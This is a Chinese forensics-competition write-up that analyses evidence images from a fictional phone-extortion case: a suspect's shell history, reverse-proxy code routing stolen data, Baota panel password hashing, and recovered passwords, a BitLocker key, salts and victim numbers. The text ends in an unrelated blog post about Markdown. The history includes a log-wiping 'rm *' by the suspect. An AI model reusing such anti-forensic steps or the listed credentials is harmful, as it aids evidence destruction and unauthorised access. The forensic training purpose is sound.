查看历史命令：history(但有时要su之后进入root用户再history)\n```bash\n[ccj@localhost ~]$ su\n密码：\n[root@localhost ccj]# history\n# 显示内容给AI解释如下：\n    1  ls  # 查看当前目录内容\n    2  cd Desktop/  # 进入桌面目录\n    3  ls  # 查看桌面文件\n    4  uname -a  # 显示系统内核详细信息\n    5  cat /etc/issue  # 查看系统发行版信息\n    6  lsb_release -a  # 显示LSB发行版信息\n    7  cat /proc/cpuinfo   # 查看CPU信息\n    8  hostname  # 显示主机名\n    9  whoiam  # 错误命令，应该是whoami\n   10  whoani  # 错误命令，应该是whoami\n   11  whoami  # 显示当前登录用户名\n   12  lspci  # 列出PCI设备\n   13  env  # 显示环境变量\n   14  lsusb  # 列出USB设备\n   15  cat /proc/meminfo   # 查看内存信息\n   16  df -h  # 显示磁盘空间使用情况（人类可读格式）\n   17  fsdisk -l  # 错误命令，应该是fdisk\n   18  fdisk -l  # 列出磁盘分区表\n   19  ps aux  # 显示所有运行中的进程\n   20  ps -ef  # 以完整格式显示所有进程\n   21  crontab -l  # 列出当前用户的定时任务\n   22  services --status-all  # 错误命令，应该是service\n   23  service --status-all  # 显示所有服务的状态\n   24  service  # 显示service命令用法\n   25  service --status-all  # 再次尝试查看服务状态\n   26  systemctl  # 显示systemctl命令用法\n   27  systemctl --help  # 查看systemctl帮助信息\n   28  systemctl -all  # 错误选项，应该是systemctl list-units\n   29  ls  # 查看当前目录\n   30  init 3  # 切换到运行级别3（多用户文本模式）\n   31  ls  # 查看当前目录\n   32  cd /  # 切换到根目录\n   33  ls  # 查看根目录内容\n   34  cd opt  # 进入opt目录\n   35  ls  # 查看opt目录内容\n   36  cd honglianjingsai/  # 进入红莲竞赛目录\n   37  ls  # 查看红莲竞赛目录内容\n   38  cd chronusNode/  # 进入chronusNode目录\n   39  ls  # 查看chronusNode目录内容\n   40  cd logs  # 进入日志目录\n   41  ls  # 查看日志文件\n   42  rm *  # 删除所有日志文件（危险操作）\n   43  ls  # 确认日志文件已删除\n   44  ip a  # 显示网络接口信息\n   45  init 3  # 再次切换到运行级别3\n   46  ls  # 查看当前目录\n   47  who  # 显示当前登录用户\n   48  w  # 显示当前登录用户及活动\n   49  cd /opt/  # 进入/opt目录\n   50  ls  # 查看/opt目录内容\n   51  cd honglianjingsai/  # 进入红莲竞赛目录\n   52  ls  # 查看目录内容\n   53  cdd chronusNode/  # 错误命令，应该是cd\n   54  cd chronusNode/  # 进入chronusNode目录\n   55  ;s  # 错误命令，分号分隔的空命令和s\n   56  ls  # 查看目录内容\n   57  cd controller/  # 进入控制器目录\n   58  ls  # 查看控制器文件\n   59  ls -l  # 以长格式查看文件详情\n   60  date  # 显示当前日期时间\n   61  history  # 显示命令历史\n   62  ls  # 查看当前目录\n   63  cd ..  # 返回上级目录\n   64  ls  # 查看目录内容\n   65  cd logs/  # 进入日志目录\n   66  ls  # 查看日志文件\n   67  ls -l  # 以长格式查看日志文件\n   68  ls  # 再次查看\n   69  cd ..  # 返回上级目录\n   70  ;s  # 错误命令\n   71  ls  # 查看目录内容\n   72  cd controller/  # 进入控制器目录\n   73  l;s  # 错误命令，应该是ls\n   74  ls  # 查看控制器文件\n   75  cd ..  # 返回上级目录\n   76  l;s  # 错误命令，应该是ls\n   77  ls  # 查看目录内容\n   78  cd static/  # 进入静态文件目录\n   79  ls  # 查看静态文件\n   80  cd .  # 停留在当前目录\n   81  cd ..  # 返回上级目录\n   82  ls  # 查看目录内容\n   83  cd uploads/  # 进入上传文件目录\n   84  ls  # 查看上传的文件\n   85  cd ..  # 返回上级目录\n   86  ls  # 查看目录内容\n   87  cd ..  # 返回上级目录\n   88  ls  # 查看目录内容\n   89  more README.txt  # 查看README文件内容\n   90  ifconfig  # 显示网络接口配置\n   91  netstat -anpt  # 显示所有网络连接和监听端口\n   92  init 3  # 切换到运行级别3\n   93  vi /etc/sysconfig/network-scripts/ifcfg-ens33  # 编辑网络接口配置\n   94  reboot  # 重启系统\n   95  ifconfig  # 显示网络接口配置\n   96  init 3  # 切换到运行级别3\n   97  ls  # 查看当前目录\n   98  firewall-cmd --add-port 80/tcp  # 添加80端口到防火墙（缺少--permanent）\n   99  systemctl start firewalld  # 启动防火墙服务\n  100  firewall-cmd --add-port 80/tcp  # 再次尝试添加80端口\n  101  ip a  # 显示IP地址信息\n  102  cd /opt  # 进入/opt目录\n  103  ls  # 查看目录内容\n  104  cd honglianjingsai/  # 进入红莲竞赛目录\n  105  ls  # 查看目录内容\n  106  cd chronusNode/  # 进入chronusNode目录\n  107  ls  # 查看目录内容\n  108  cd controller/  # 进入控制器目录\n  109  ls  # 查看控制器文件\n  110  vi ADProxy.js  # 编辑ADProxy.js文件\n  111  ls  # 查看文件\n  112  cd /opt/  # 进入/opt目录\n  113  ls  # 查看目录内容\n  114  cd honglianjingsai/  # 进入红莲竞赛目录\n  115  ls  # 查看目录内容\n  116  cd chronusNode/  # 进入chronusNode目录\n  117  ls  # 查看目录内容\n  118  cd controller/  # 进入控制器目录\n  119  ls  # 查看控制器文件\n  120  more ADProxy.js  # 查看ADProxy.js文件内容\n  121  clear  # 清屏\n  122  ls  # 查看当前目录\n  123  cd ..  # 返回上级目录\n  124  ls  # 查看目录内容\n  125  node app.js  # 启动Node.js应用\n  126  clear  # 清屏\n  127  history  # 显示命令历史\n  128  cd /opt/honglianjingsai/  # 进入红莲竞赛目录\n  129  ls  # 查看目录内容\n  130  cd chronusNode/  # 进入chronusNode目录\n  131  ls  # 查看目录内容\n  132  cd controller/  # 进入控制器目录\n  133  ls  # 查看控制器文件\n  134  vi ADProxy.js  # 编辑ADProxy.js文件\n  135  yum vim  # 错误命令，应该是yum install vim\n  136  yum install vim  # 安装vim编辑器\n  137  ls  # 查看文件\n  138  ping www.baidu.com  # 测试网络连接到百度\n  139  ping baidu.com  # 测试网络连接\n  140  yum install vim  # 安装vim编辑器\n  141  vim ADProxy.js  # 使用vim编辑ADProxy.js\n  142   more ADProxy.js   # 查看ADProxy.js内容\n  143  vim ADProxy.js  # 再次编辑ADProxy.js\n  144  cd ..  # 返回上级目录\n  145  lsls  # 错误命令，应该是ls\n  146  ls  # 查看目录内容\n  147  more README.txt  # 查看README文件内容\n  148  cd chronusNode/controller/  # 进入控制器目录\n  149  vim ADProxy.js  # 编辑ADProxy.js文件\n  150  cd ..  # 返回上级目录\n  151  ls  # 查看目录内容\n  152  vim const.js  # 编辑const.js常量文件\n  153  firewall-cmd --zone=public --add-port=80/tcp --permanent  # 永久添加80端口到防火墙\n  154  ifconfig  # 显示网络接口配置\n  155  ping 192.168.110.111  # 测试连接到指定IP\n  156  ls  # 查看当前目录\n  157  cd controller/  # 进入控制器目录\n  158  ls  # 查看控制器文件\n  159  vim ADProxy.js  # 编辑ADProxy.js文件\n  160  firewall-cmd --add-port=80/tcp --permanent  # 永久添加80端口\n  161  systemctl stop firewalld  # 停止防火墙服务\n  162  vim ADProxy.js  # 编辑ADProxy.js文件\n  163  LS  # 错误命令，应该是ls（大写）\n  164  ls  # 查看文件\n  165  cd ..  # 返回上级目录\n  166  ls  # 查看目录内容\n  167  cd logs/  # 进入日志目录\n  168  ls  # 查看日志文件\n  169  more 2021-4-23-6-34.log  # 查看指定日志文件\n  170  more 2021-4-23-6-31.log  # 查看另一个日志文件\n  171  cd ..  # 返回上级目录\n  172  cd controller/  # 进入控制器目录\n  173  ls  # 查看控制器文件\n  174  vim ADProxy.js  # 编辑ADProxy.js文件\n  175  vim /etc/hosts  # 编辑主机名解析文件\n  176  vim ADProxy.js  # 编辑ADProxy.js文件\n  177  cd ..  # 返回上级目录\n  178  ls  # 查看目录内容\n  179  node app.js  # 启动Node.js应用\n  180  reboot  # 重启系统\n  181  cd /opt  # 进入/opt目录\n  182  ls  # 查看目录内容\n  183  cd honglianjingsai/  # 进入红莲竞赛目录\n  184  ls  # 查看目录内容\n  185  cd chronusNode/  # 进入chronusNode目录\n  186  ls  # 查看目录内容\n  187  node app.js  # 启动Node.js应用\n  188  history  # 显示命令历史\n  189  cd /opt/  # 进入/opt目录\n  190  cd honglianjingsai/  # 进入红莲竞赛目录\n  191  ls  # 查看目录内容\n  192  cd chronusNode/  # 进入chronusNode目录\n  193  cd controller/  # 进入控制器目录\n  194  ls  # 查看控制器文件\n  195  vim ADProxy.js  # 编辑ADProxy.js文件\n  196  cd ..  # 返回上级目录\n  197  ls  # 查看目录内容\n  198  cd logs/  # 进入日志目录\n  199  l;s  # 错误命令，应该是ls\n  200  ls  # 查看日志文件\n  201  ll  # 显示详细文件列表（ls -l的别名）\n  202  vim 2021-4-23-17-36.log  # 编辑日志文件\n  203  cd /opt/  # 进入/opt目录\n  204  ls  # 查看目录内容\n  205  cd honglianjingsai/  # 进入红莲竞赛目录\n  206  ls  # 查看目录内容\n  207  cd chronusNode/  # 进入chronusNode目录\n  208  ls  # 查看目录内容\n  209  cd controller/  # 进入控制器目录\n  210  ls  # 查看控制器文件\n  211  vim ADProxy.js  # 编辑ADProxy.js文件\n  212  history  # 显示命令历史\n  213  reboot  # 重启系统\n  214  cd /opt/honglianjingsai/  # 进入红莲竞赛目录\n  215  ls  # 查看目录内容\n  216  cd chronusNode/  # 进入chronusNode目录\n  217  ls  # 查看目录内容\n  218  cd logs  # 进入日志目录\n  219  ls -la  # 以长格式显示所有文件（包括隐藏文件）\n  220  cat 2021-4-23-6-53.log  # 查看日志文件内容\n  221  cat 2021-4-23-17-39.log  # 查看另一个日志文件内容\n  222  date  # 显示当前日期时间\n  223  systemctl start firewalld  # 启动防火墙服务\n  224  firewall-cmd --add-port 80/tcp  # 添加80端口到防火墙\n  225  cd ..  # 返回上级目录\n  226  ls  # 查看目录内容\n  227  cd controller/  # 进入控制器目录\n  228  ls  # 查看控制器文件\n  229  vi ADProxy.js  # 编辑ADProxy.js文件\n  230  ls  # 查看文件\n  231  vi ADTCPDeliver.js  # 编辑TCP传输控制器文件\n  232  vi ADFileServer.js  # 编辑文件服务器控制器文件\n  233  ls  # 查看文件\n  234  cd ..  # 返回上级目录\n  235  ls  # 查看目录内容\n  236  vi app.js  # 编辑主应用文件\n  237  ls  # 查看文件\n  238  cd controller/  # 进入控制器目录\n  239  ls  # 查看控制器文件\n  240  vi ADProxy.js  # 编辑ADProxy.js文件\n  241  ls  # 查看文件\n  242  cd ..  # 返回上级目录\n  243  ls  # 查看目录内容\n  244  cd model/  # 进入模型目录\n  245  ls  # 查看模型文件\n  246  cd ..  # 返回上级目录\n  247  ls  # 查看目录内容\n  248  cd node_modules/  # 进入Node.js模块目录\n  249  ls  # 查看模块文件\n  250  ifconfig  # 显示网络接口配置\n  251  reboot  # 重启系统\n  252  clear  # 清屏\n  253  cd /opt/honglianjingsai/chronusNode/  # 进入应用目录\n  254  ls  # 查看目录内容\n  255  cd logs/  # 进入日志目录\n  256  ls  # 查看日志文件\n  257  ls -la  # 以长格式显示所有文件\n  258  cd .  # 停留在当前目录\n  259  ls  # 查看文件\n  260  ls -la  # 以长格式显示所有文件\n  261  date  # 显示当前日期时间\n  262  vim 2021-4-23-18-59.log  # 编辑日志文件\n  263  date  # 显示当前日期时间\n  264  timedatectl  # 显示系统时间设置\n  265  timedatectl set-timezone UTC  # 设置时区为UTC\n  266  timedatectl  # 确认时区设置\n  267  date  # 显示当前日期时间\n  268  ls  # 查看当前目录\n  269  last  # 显示最近登录用户\n  270  clear  # 清屏\n  271  ififconfigiig  # 错误命令，应该是ifconfig\n  272  ifconfig  # 显示网络接口配置\n  273  reboot  # 重启系统\n  274  clear  # 清屏\n  275  ifconfig  # 显示网络接口配置\n  276  ifconfig  # 再次显示网络接口配置\n  277  cd /opt/honglianjingsai/chronusNode/  # 进入应用目录\n  278  node app.js  # 启动Node.js应用\n  279  shutdown -r now  # 立即重启系统\n  280  history  # 显示完整的命令历史\n```\n- 操作\n```bash\n[root@localhost ccj]# cd /opt/\n[root@localhost opt]# cd honglianjingsai/\n[root@localhost honglianjingsai]# ls\nchronusNode  node-v14.16.1-linux-x64.tar.xz  README.txt\n[root@localhost honglianjingsai]# vi README.txt\n```\n\n![alt text](/img/第三届长安杯笔记_6-1.png)\n```txt\n修改服务器端口在目录chronusNode/const.js下修改参数server_config/port，默认为8800，即访问路径http://localhost:8800即可\n修改反向代理目标地址在目录chronusNode/controller/ADProxy.js下修改函数service即可\n```\n- 找到ADProxy.js路径，打开如下：\n```js\n/**\n * 反向代理\n *\n */\nmodule.exports = function(_brain, _app) {\n    /* INCLUDE */\n    const path = _brain.A.path;\n    const async = _brain.A.async;\n    const proxy = require('http-proxy-middleware');\n    const net = require('net');\n    /* DEFINE */\n    const _tag = path.basename(__filename, \".js\");\n    var _isBanned = false;\n    var _isStarted = false;\n    if(!_brain.A.checkIsNull(_brain.C.autorun_config[_tag], _tag)){\n        _isStarted = _brain.C.autorun_config[_tag];\n    }\n    /* DEFINE PROXY */\n    const _proxy50 = {\n        protocol: 'http:',\n        host: '192.168.110.111',\n        port: 80\n    }\n    const _proxy100 = {\n        protocol: 'http:',\n        host: '192.168.110.112',\n        port: 80\n    }\n    const _proxy100p = {\n        protocol: 'http:',\n        host: '192.168.110.113',\n        port: 80\n    }\n\t/*明确配置了3个后端服务器，这是负载均衡的典型特征！！！*/\n    /* Private Function */\n    /**\n     * Service Running\n     */\n    var service = function (){\n        if(!_isStarted) return;\n        // proxy middleware options\n        const _proxyer_chronus = proxy({\n            target: '/', // target host\n            changeOrigin: true,               // needed for virtual hosted sites\n            ws: true,                          // proxy websockets\n            router: function(req) {\n                var clientIP = req.get(\"x-forwarded-for\")\n                if (clientIP == undefined) {\n                    clientIP = req.connection.remoteAddress\n                }\n                var clientIPArr = clientIP.split(\".\")\n                if (clientIPArr.length == 4) {\n                    var clientIP3Int = parseInt(clientIPArr[2])\n                    global.logger.warn('[Proxy_RequestHeader] -> ' + JSON.stringify(req.headers));\n                    global.logger.warn('[Proxy_ClientIP] -> ' + clientIP);\n\t\t\t\t\t // 基于IP第三段的分流逻辑\n                    if (clientIP3Int <= 50) {\n                        global.logger.warn('[Proxy_Destination] -> ' + JSON.stringify(_proxy50));\n                        return _proxy50\n                    } else if (clientIP3Int <= 100) {\n                        global.logger.warn('[Proxy_Destination] -> ' + JSON.stringify(_proxy100));\n                        return _proxy100\n                    } else {\n                        global.logger.warn('[Proxy_Destination] -> ' + JSON.stringify(_proxy100p));\n                        return _proxy100p\n                    }\n                }\n            }\n        })\n\n        _app.all('/*', _proxyer_chronus);// 所有请求都经过代理\n    };\n\n    /**\n     * Service Killing\n     */\n    var serviceKiller = function (){\n    };\n\n\n    /* Public Function */\n    /* 返回_tag */\n    var getTag = function (){\n        return _tag;\n    };\n    /* 判断服务是否开启 */\n    var isStarted = function (){\n        return _isStarted;\n    };\n    /* 判断服务是否被意外禁止 */\n    var isBanned = function (){\n        return _isBanned;\n    };\n\n    /* 服务开关 */\n    var startServer = function (callBack){\n        _isStarted = true;\n        service();\n        if(callBack)\n            callBack(100, _tag + ' Started');\n    };\n\n    var stopServer = function (callBack){\n        _isStarted = false;\n        serviceKiller();\n        if(callBack)\n            callBack(100, _tag + ' Stopped');\n    };\n\n    /* Service AutoRun */\n    if(_isStarted){\n        startServer();\n    }else{\n        stopServer();\n    }\n\n    return{\n        getTag             : getTag,\n        isStarted          : isStarted,\n        isBanned           : isBanned,\n        startServer        : startServer,\n        stopServer         : stopServer,\n    };\n}\n```\n- 作用：负载均衡\n\n#### 15. 上一题中，提到的主要功能对应的服务监听的端口为：\t\n- 上面README.txt中有：修改服务器端口在目录chronusNode/const.js下修改参数server_config/port，默认为8800，即访问路径http://localhost:8800即可\n- 打开const.js，寻找参数server_config/port\n```js\n    /* 服务器基本配置 */\n    server_config : {\n        host : '0.0.0.0',\n        port : 80,\n        safe_port : 8443,\n        static_path : 'static',\n        static_host : '127.0.0.1'\n```\n- 答案：80\n\n#### 16. 上一题中，提到的服务所使用的启动命令为：\t\n- 最开始历史命令可以看到：node app.js  # 启动Node.js应用\n\n#### 17. 经分析，该服务对于请求来源IP的处理依据是：根据请求源IP地址的第（）位进行判断【标准格式：9】\t\n```js\nvar clientIPArr = clientIP.split(\".\")  // 将IP按点号分割成数组\nif (clientIPArr.length == 4) {\n    var clientIP3Int = parseInt(clientIPArr[2])  // 提取第三段并转为整数\n    //                      ↑\n    //                  数组索引2对应第三段\n    // 数组索引: [0]    [1]    [2]    [3]\n    // IP示例:  192  . 168  . 110  . 111\n    //          第一段  第二段  第三段  第四段\n```\n\n#### 18. 经分析，当判断条件小于50时，服务器会将该请求转发到IP为（）的服务器上【标准格式：111.111.111.111】\t\n```js\n                    if (clientIP3Int <= 50) {\n                        global.logger.warn('[Proxy_Destination] -> ' + JSON.stringify(_proxy50));\n                        return _proxy50\n```\n```js\n    /* DEFINE PROXY */\n    const _proxy50 = {\n        protocol: 'http:',\n        host: '192.168.110.111',\n        port: 80\n    }\n```\n\n#### 19. 请分析，该服务器转发的目标服务器一共有几台【标准格式：9】\t\n- 3\n\n#### 20. 请分析，受害者通讯录被获取时，其设备的IP地址为【标准格式：111.111.111.111】【待 问题未解答】\t\n- 问题：1怎么知道是红米的那个2wp里面的诡异时间点是怎么出来的3文件导不出来\n- 报警时间：2021年4月25日，上午8点左右\n- 在日志中注意时间是UTC时间，所以日志减8去对应报警时间和作案时间\n\n![alt text](/img/第三届长安杯笔记_6-2.png)\n- 一直访问内网192.168.110.110，所以是本地嫌疑人ip：192.168.110.203\n\n![alt text](/img/第三届长安杯笔记_6-3.png)\n- 对应时间找到ip\n\n#### 21. 请分析，受害者的通讯录被窃取之后，经由该服务器转发到了IP为（）的服务器上【标准格式：111.111.111.111】\t\n- 不管谁都是转发到192.168.110.113\n\n![alt text](/img/第三届长安杯笔记_6-4.png)\n### 通过对检材二的分析，警方进一步掌握并落地到了目标服务器地址，通过对服务器进行证据固定，得到服务器镜像--检材三，请使用第21题答案对检材三进行解密并分析，回答下列问题：\t\t\n\n#### 22. 检材三的原始硬盘的SHA256值为：\t【待 问题未解答】\n- 问题：1怎么知道是web3哇\n\n![alt text](/img/第三届长安杯笔记_6-5.png)\n\n#### 23. 请分析第21题中，所指的服务器的开机密码为：\n- 检材四 嫌疑人的PC端的Xshell中看到连接记录\n- 选择原因：看负责转发的服务器B的密码看转发对象CDE的账密是经验之谈，而不是规律\n- 但这个是选择的直接证据：没有看到192.168.110.110被转发信息\n\n![alt text](/img/第三届长安杯笔记_6-11.png)\n![alt text](/img/第三届长安杯笔记_6-10.png)\n- honglian7001\n\n#### 24. 嫌疑人架设网站使用了宝塔面板，请问面板的登陆用户名为：\t\n- hl123\n\n![alt text](/img/第三届长安杯笔记_6-6.png)\n#### 25. 请分析用于重置宝塔面板密码的函数名为\t\n- [框架知识点](/2025/10/13/宝塔面板知识点)\n- 宝塔面板重置网站密码功能调用的是tools.py\n- 宝塔后台数据库叫default.db\n- 宝塔的工具面板的代码是在/www/server/panel下面，直接火眼文件里找\n- .py后缀有两个文件\n- test.py和tool.py中看到同样内容：\n```python\n#设置面板密码\ndef set_panel_pwd(password,ncli = False):\n    import db\n    sql = db.Sql()\n    result = sql.table('users').where('id=?',(1,)).setField('password',public.password_salt(public.md5(password),uid=1))\n    username = sql.table('users').where('id=?',(1,)).getField('username')\n    if ncli:\n        print(\"|-用户名: \" + username)\n        print(\"|-新密码: \" + password)\n    else:\n        print(username)\n```\n- set_panel_pwd\n\n#### 26. 请分析宝塔面板登陆密码的加密方式所使用的哈希算法为\t\n- md5 24题已知\n\n#### 27. 请分析宝塔面板对于其默认用户的密码一共执行了几次上题中的哈希算法\t\n- 3次\n```python\n#设置面板密码\ndef set_panel_pwd(password,ncli = False):\n    import db\n    sql = db.Sql()\n    result = sql.table('users').where('id=?',(1,)).setField('password',public.password_salt(public.md5(password),uid=1))\n    username = sql.table('users').where('id=?',(1,)).getField('username')\n    if ncli:\n        print(\"|-用户名: \" + username)\n        print(\"|-新密码: \" + password)\n    else:\n        print(username)\n```\n- 发现这里调用了public类的md5方法，在/www/server/panel/class里面可以找到public.py,导出搜索password：\n```py\ndef password_salt(password,username=None,uid=None):\n    '''\n        @name 为指定密码加盐\n        @author hwliang<2020-07-08>\n        @param password string(被md5加密一次的密码)\n        @param username string(用户名) 可选\n        @param uid int(uid) 可选\n        @return string\n    '''\n    chdck_salt()\n    if not uid:\n        if not username:\n            raise Exception('username或uid必需传一项')\n        uid = M('users').where('username=?',(username,)).getField('id')\n    salt = M('users').where('id=?',(uid,)).getField('salt')\n    return md5(md5(password+'_bt.cn')+salt)\n```\n\n#### 28. 请分析当前宝塔面板密码加密过程中所使用的salt值为【区分大小写】\t\n- v87ilhAVumZL 24题已得\n- 打开宝塔面板数据库/www/server/panel/default.db，在user表中也看\n\n#### 29. 请分析该服务器，网站源代码所在的绝对路径为\t\n\n![alt text](/img/第三届长安杯笔记_6-13.png)\n#### 30. 请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材五，并重构网站）【标准格式：111.111.111.111】：192.168.110.115-CAB2021\n- /www/wwwroot/www.honglian7001/app/databae.php\n- 遍历网站文件，找数据库文件\n\n![alt text](/img/第三届长安杯笔记_6-14.png)\n- 192.168.110.115\n\n#### 31. 请分析，数据库的登陆密码为【区分大小写】\t\n- 30题已得\n- wxrM5GtNXk5k5EPX\n\n#### 32. 请尝试重构该网站，并指出，该网站的后台管理界面的入口为【标准格式：/web】【待 问题未解答】\n- RStudioProtable-打开镜像导入文件，新建虚拟快RAID和自动检测，拖拽镜像文件，自动检测\n\n![alt text](/img/第三届长安杯笔记_6-15.png)\n- 火眼依据信息导入\n\n![alt text](/img/第三届长安杯笔记_6-16.png)\n- 问我要密码？我又不知道。。。估计火眼仿真默认改123456了账户就用root不然网站无法重构！！！\n\n#### 33. 请分析该涉案网站代码中对登录用户的密码做了加密处理。请找出加密算法中的salt值【区分大小写】\t\n\n![alt text](/img/第三届长安杯笔记_6-34.png)\n- lshi4AsSUrUOwWV\n\n#### 34. 请分析该网站的管理员用户的密码为：\t\n- 登录宝塔，[常用命令](/2025/10/19/宝塔命令)\n- ```bt defalt```获得为默认密码，不显示更改后密码！！！\n\n![alt text](/img/第三届长安杯笔记_6-35.png)\n- 对应案发时间，只有 202104 这个时间是比较符合的，在这个文件夹下只有两个日志，我们打开搜索 password 就可以找到只有两个密码，分别是 123456 和 security ，对应用户名都是 admin，我们只需要在刚刚重构好的登录界面尝试哪个密码可以登录到后台，哪个密码就是本题的答案（security）\n\n#### 35. 在对后台账号的密码加密处理过程中，后台一共计算几次哈希值\t\n- 见33题图，原密码md5拼接salt值的md5，拼接的结果再进行一次md5，一共3次\n\n#### 36. 请统计，后台中，一共有多少条设备记录\t\n\n![alt text](/img/第三届长安杯笔记_6-36.png)\n#### 37. 请通过后台确认，本案中受害者的手机号码为\t\n- 小白鼠.txt里面查看\n\n![alt text](/img/第三届长安杯笔记_6-33.png)\n- 设备18644099137通讯录\n\n#### 38. 请分析，本案中受害者的通讯录一共有多少条记录\n- 小白鼠.txt里面查看，上题已得：34\n\n### 通过对检材二和三进行分析，警方通过IP落地，警方掌成功抓获犯罪嫌疑人，现将嫌疑人的PC机和手机进行了取证，分别制作了镜像，请使用第13题的答案对检材四进行解密，并回答下列问题\t（192.168.110.203-CAB2021）\n\n#### 39. 请计算检材四-PC的原始硬盘的SHA256值\t\n\n![alt text](/img/第三届长安杯笔记_6-8.png)\n#### 40. 请分析，检材四-PC的Bitlocker加密分区的解密密钥为\t\n\n![alt text](/img/第三届长安杯笔记_6-7.png)\n```txt\nBitLocker 驱动器加密恢复密钥*要验证这是否为正确的恢复密钥，请将以下标识符的开头与电脑上显示的标识符值进行比较。标识符: 3BC73D1D-E5B0-4592-B9D6-42D0A306B625如果以上标识符与电脑显示的标识符匹配，则使用以下密钥解锁你的驱动器。恢复密钥: 511126-518936-161612-135234-698357-082929-144705-622578如果以上标识符与电脑显示的标识符不匹配，则该密钥不是解锁你的驱动器的正确密钥。请尝试其他恢复密钥，或参阅 https://go.microsoft.com/fwlink/?LinkID=260589 以获得其他帮助。\n```\n- 注意：Bitlocker解密后火眼要全部重新分析！！！\n\n#### 41. 请分析，检材四-PC的开机密码为\t\n- 39题已知\n\n#### 42. 经分析发现，检材四-PC是嫌疑人用于管理服务器的设备，其主要通过哪个浏览器控制网站后台\t\n- chrome\n\n![alt text](/img/第三届长安杯笔记_6-17.png)\n#### 43. 请计算PC检材中用户目录下的zip文件的sha256值\t\n- 搜索得到users目录位置\n\n![alt text](/img/第三届长安杯笔记_6-19.png)\n- 目录内搜索zip，创建任务\n\n![alt text](/img/第三届长安杯笔记_6-18.png)\n- 0DD2C00C8C6DBDEA123373F91A3234D2F07D958355F6CD7126E397E12E8ADBB3\n\n#### 44. 请分析检材四-phone，该手机的IMEI号为\t\n\n![alt text](/img/第三届长安杯笔记_6-9.png)\n#### 45. 请分析检材四-phone，嫌疑人和本案受害者是通过什么软件开始接触的【标准格式：支付宝】\t\n- 伊对\n\n![alt text](/img/第三届长安杯笔记_6-22.png)\n#### 46. 请分析检材四-phone，受害者下载恶意APK安装包的地址为\t\n- 45题两聊天记录下面就是\n- https://cowtransfer.com/s/a6b28b4818904c\n\n#### 47. 请分析检材四-phone，受害者的微信内部ID号为\t\n- wxid_op8i06j0aano22\n\n![alt text](/img/第三届长安杯笔记_6-24.png)\n#### 48. 请分析检材四-phone，嫌疑人用于敲诈本案受害者的QQ账号为\t\n- 1649840939\n\n![alt text](/img/第三届长安杯笔记_6-26.png)\n#### 49. 请综合分析，嫌疑人用于管理敲诈对象的容器文件的SHA256值为\t\n- 43题zip解压，密码为12306，与账密相同，当然也可以暴力破解，但注意暴力的位数5\n- 火眼仿真获得密码money\n- 打开此电脑快速访问\n\n![alt text](/img/第三届长安杯笔记_6-28.png)\n- VC挂载，key.rar作为密匙文件\n- 嫌疑人用于管理敲诈对象的容器文件是小白鼠.txt\n\n![alt text](/img/第三届长安杯笔记_6-31.png)\n- 9C4BE29EB5661E6EDD88A364ECC6EF004C15D61B08BD7DD0A393340180F15608\n- 但为什么小白鼠.txt导出后这么算哈希值不一样？？？\n\n![alt text](/img/第三届长安杯笔记_6-31-1.png)\n#### 50. 请综合分析嫌疑人检材，另外一受害者\"郭先生\"的手机号码为\t\n- 15266668888\n\n![alt text](/img/第三届长安杯笔记_6-29.png)\n#### 51. 通过嫌疑人检材，其中记录了几位受害者的信息\t\n- 5\n\n![alt text](/img/第三届长安杯笔记_6-30.png)\n#### 52. 请使用第11题的密码解压\"金先生转账.zip\"文件，并对压缩包中的文件计算SHA256值\t\n- 11题：c74d97b01eae257e44aa9d5bade97baf\n- cd62a83690a53e5b441838bc55ab83be92ff5ed26ec646d43911f119c15df510\n- hashcalc算\n\n#### 53. 请综合分析，受害者一共被嫌疑人敲诈了多少钱（转账截图被隐藏在多个地方）【未解决】\n- 伊对1000\n![alt text](/img/第三届长安杯笔记_6-25.png)\n- 微信2000\n![alt text](/img/第三届长安杯笔记_6-21.png)\n- QQ\n  - 600 + 【2笔转账记录我都已经保存好了/悠闲】\n![alt text](/img/第三届长安杯笔记_6-27.png)\n  - 打不开图片\n![alt text](/img/第三届长安杯笔记_6-32.png)\n- \"金先生转账.zip\"文件\n  - 2000 交易时间：2021-04-24 18:30:25\n- **数据库里面还有个？！**\n- navicat连接，导出成txt，厨子魔法棒可以发现是base64编码过的jpg图片，解码后保存为图片就能正常查看，有1000元\n![alt text](/img/第三届长安杯笔记_6-39.png)\n![alt text](/img/第三届长安杯笔记_6-38.png)\n![alt text](/img/第三届长安杯笔记_6-37.png)\n\n### 总体分析：\n- 数字是192.168.110.后第四段数字\n  - A 受害者252\n  - B apk回传数据的服务器 负责转发的服务器203\n  - C D E 建数据库的宝塔，三个转发对象111 112 113\n  - F window ssh连接三个对象\n- 192.168.110开头的IP地址属于私有地址段，通常作为路由器管理后台的默认网关。所以这几个ip在这个这个服务器集群里面是一直使用并代表所在服务器使用\n\n\t\n","tags":["wp","电子取证"],"categories":["wp"]},{"title":"markdown-github+vscode使用文档","url":"/2025/10/01/markdown-github-vscode使用文档/","content":"## 常用hexo命令\n- 本地预览\n```cmd\nhexo clean && hexo g && hexo s\n```\n\n## 引用博客内文章\n- \\[显示文字](/2025/10/日期/文字名称)\n- 例子：\n```\n[框架知识点](/2025/10/13/宝塔面板知识点)\n```\n- 效果：[框架知识点](/2025/10/13/宝塔面板知识点)\n\n## 快捷键\n- Markdown All in One 插件支持许多 Markdown 语法的快捷键，使得格式化文本、插入链接、图片和其他元素变得非常简单。\n\n<!-- 让表格居中显示的风格 -->\n<style>\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n</style>\n<div class=\"center\">\n\n| 操作 | 快捷键 | 操作 | 快捷键 |\n|:----:|:----:|:----:|:----:|\n| 加粗 | Ctrl + B | 撤销 | Ctrl + Z |\n| 斜体 | Ctrl + I | 重做 | Ctrl + Y |\n| 删除线 | Alt + S | 标题(uplevel) | Ctrl + Shift + ] |\n| Toggle math environment | Ctrl + M | 标题(downlevel) | Ctrl + Shift + [ |\n| Check/Uncheck task list item | Alt + C |  |  |\n</div>\n\n## 目录和标题\n- （Github 版）如果使用 [TOC] 命令来生成目录，需要下载 “Markdown TOC” 插件。（未实践）\n- 在 Github 版上不下载 Markdown TOC 插件创建目录的方法：按下快捷键 Ctrl + Shift + P 调出命令框，输入 Markdown ，找到 “Markdown All in One：创建目录” 即可。\n- 使用 # 符号来创建标题。一个 # 是一级标题，两个 # 是二级标题，以此类推，最多六级。\n## 文本样式\n- 使用 * 或 _ 包围的文本会变为**斜体**。\n- 使用 ** 或 __ 包围的文本会被**加粗**。\n- 使用 *** 或 ___ 包围的文本会变为**粗斜体**。\n- 使用 